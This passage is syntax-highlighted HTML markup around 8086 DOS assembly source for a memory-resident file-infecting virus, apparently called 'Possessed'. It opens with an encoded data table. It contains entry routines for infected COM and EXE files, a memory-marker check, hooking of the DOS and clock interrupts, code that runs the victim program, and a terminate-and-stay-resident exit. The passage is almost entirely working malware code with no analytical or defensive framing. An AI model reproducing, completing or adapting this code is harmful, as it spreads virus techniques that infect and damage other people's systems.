  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc4">,</span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">7bh</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">8fh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
 </span><span class="sc5">ComEntry</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NotInMemory</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MemoryResident</span><span class="sc0">
 
 </span><span class="sc5">ExeEntry</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ExecuteVictimExe</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MoveVirusCode</span><span class="sc0">
 
 </span><span class="sc5">ExecuteVictimExe</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeSs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">ExeSp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeCs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeVictimSegment</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeIp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeVictimOffset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExecuteExeVictim</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 
 </span><span class="sc5">SecondMove</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SetUpPossessed</span><span class="sc0">
 
 </span><span class="sc5">NotInMemory</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetUpPossessed</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">retf</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
 </span><span class="sc5">SetUpPossessed</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Psp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Environment</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ComEntry</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-(</span><span class="sc2">3521h</span><span class="sc4">-</span><span class="sc2">0b806h</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isDos</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Timer</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Hour</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">3508h</span><span class="sc4">-</span><span class="sc2">2521h</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ClockIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ClockIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isClock</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Psp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExecParam</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">5ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">6ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Environment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosVersion</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">OldDosVersion</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">Environment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">
 </span><span class="sc5">LookForStartOfAsciiz</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">SearchEnvironment</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">SearchEnvironment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GotExecPath</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc5">SearchEnvironment</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LookForStartOfAsciiz</span><span class="sc0">
 </span><span class="sc5">OldDosVersion</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameOfVictim</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAsciiz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAsciiz</span><span class="sc0">
 </span><span class="sc5">GotExecPath</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">Psp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ViruSs</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ViruSp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExecParam</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">DosVersion</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">DoIntCall</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreStack</span><span class="sc0">
 </span><span class="sc5">DoIntCall</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">RestoreStack</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc5">ViruSs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">ViruSp</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">GetReturnCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PossessedId</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">GetReturnCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Environment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FirstGenerationFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc5">MemoryResident</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">FirstGenerationFlag</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NotFirstGeneration</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 
